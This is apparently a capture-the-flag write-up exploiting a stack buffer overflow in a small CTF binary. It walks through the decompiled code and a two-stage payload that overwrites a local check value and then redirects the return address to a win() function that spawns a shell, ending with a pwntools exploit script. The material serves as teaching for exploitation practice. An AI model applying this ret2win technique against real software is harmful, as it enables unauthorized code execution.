# Challenge One

## General

You can download the [binary](./chall_one) , if you want to test it locally .

## Overview

Output of file command on binary :
```
$ file chall_one
chall_one: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e4a15d68b537c4977341a710db4bb5da35b01bcb, for GNU/Linux 3.2.0, not stripped
```
Output of checksec command :
```
$ checksec chall_one
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
We can conclude that there are no major security measures on the binary except the enabling of NX .

## Decompilation on ghidra 

Main method : 
```

ulong main(undefined4 uParm1,undefined8 uParm2)

{
  char local_26 [10];
  int local_1c;
  undefined8 local_18;
  undefined4 local_10;
  uint local_c;
  
  local_c = 0;
  local_1c = -0x35014542;
  local_18 = uParm2;
  local_10 = uParm1;
  fgets(local_26,0x14,stdin);
  if (local_1c == -0x45413502{
    puts("stage one cleared");
    vuln();
  }
  return (ulong)local_c;
}
\\ After seeing the raw source code of binary,I found out that the negative hex values were actually 0xcafebabe and 0xbabecafe respectively
```

vuln method :
```

void vuln(void)

{
  char local_12 [10];
  
  gets(local_12);
  return;
}

```

Another interesting function which you can see in decompiled code is win() , here is its source code :
```
void win(void)

{
  printf("You win!\n");
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}

```
## How to Exploit : 

### Stage-one
We observe a basic buffer overflow in the `local_26` variable of main function as we can write `20 bytes` in it whereas the size allocated to it is only `10 bytes` . So , we are able to overwrite further `10 bytes` in stack meant for other local variables !
Initially , `local_1c` variable was loaded with the value : `0xcafebabe` . We had to overwrite this variable and make its value `0xbabecafe` in order to pass first check. This variable was just below our input variable `local_26` in stack ,therefore we can write 10 bytes meant for `local_26` and then further overwrite `4 bytes` of `local_1c` variable .

So,this payload `b'A'*10+p32(int("babecafe",16))` will be enough to overwrite `local_1c` variable and pass our first stage .

### Poppin' a shell
So, pat your back you passed the first check ! Now we need to somehow access win function and pop a shell via `/bin/sh` .
Going to the vuln() function , there is a buffer overflow in local_12 variable as the function uses gets() to take input . local_12 is occupying 10 bytes on stack . Below it is 8 bytes of saved `%rbp` register and then 8 bytes of `return address`. We need to overwrite these 8 bytes of return address so that when `%rip` register accesses this address, it goes to `win()` function instead of intended `main()` function .  
As this is a 64 bit binary , we have function addresses as 64 bits. Extracting the address of `win()` using objdump.

```
$ odjdump -d chall_one | grep "win"
0000000000401170 <win>:
```
So the address of `win()` is 0x401170 .

Now final payload after entering `vuln()` would be `b'A'*18+p64(int("401170",16))` . `8 bytes` to overwrite `saved %rbp value` and then further `8 bytes` to overwrite return address.

That's how you enter win() function and pop a shell !

## Final exploit

```from pwn import *
p=process("./chall_one")
gdb.attach(p)
p.sendline(b'A'*10+p32(int("babecafe",16)))
p.sendline(b'A'*18+p64(int("401170",16)))
p.interactive()
```

Thanks for reading . Happy hacking !




